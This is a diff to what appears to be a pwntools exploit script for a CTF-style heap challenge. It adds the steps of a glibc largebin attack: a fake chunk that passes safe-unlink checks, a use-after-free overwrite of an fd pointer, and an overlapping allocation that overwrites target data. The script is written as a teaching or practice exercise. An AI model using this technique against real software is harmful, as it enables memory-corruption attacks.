@@ -53,7 +53,11 @@ heap = int(io.recvline(), 16)
 
 # Craft a fake 0x400-sized chunk in the username field, which preceeds the target data.
 # Ensure its fd & bk point to itself to satisfy safe unlinking.
-username = b"A"*8
+username = (p64(0) + p64(0x401) +
+           # exact size including prev_inuse
+           p64(elf.sym.user) + p64(elf.sym.user)
+           # will pass safe unlink checks by pointing to itself
+           )
 io.sendafter(b"username: ", username)
 io.recvuntil(b"> ")
 
@@ -99,9 +103,18 @@ malloc(0x400)
 # So chunk_A's fd pointer thanks to the uaf-write vulnerability can be overwritten, to point
 # to the target we'd like to overwrite.
 
-# Chunk A will end up as a skip-chunk in the 0x400-largebin
-# We don't subtract anything here, malloc deals with metadata when dealing with ptrs to chunks
+# 6. Chunk A will end up as a skip-chunk in the 0x400-largebin
+#    We don't subtract anything here, malloc deals with metadata when dealing with ptrs to chunks
+#    Also keep in mind, that chunk_A's size field (elf.sym.user in that case) must be an exact match,
+#    cause the chunk_nomask macro from libc gets used while checking (mchunk_size gets used here).
 edit(chunk_A, p64(elf.sym.user))
+
+# 7. Chunk_A's fd pointer in largebin is not the last in the list, with it's fd actually pointing
+#    to our fake chunk at elf.sym.user.
+#    If we request an exact fit of 0x400, a chunk at the desired target location will be delivered.
+overlap = malloc(0x3f8)
+edit(overlap, p64(0)*4 + b"Much win!")
+
 # =============================================================================
 
 io.interactive()
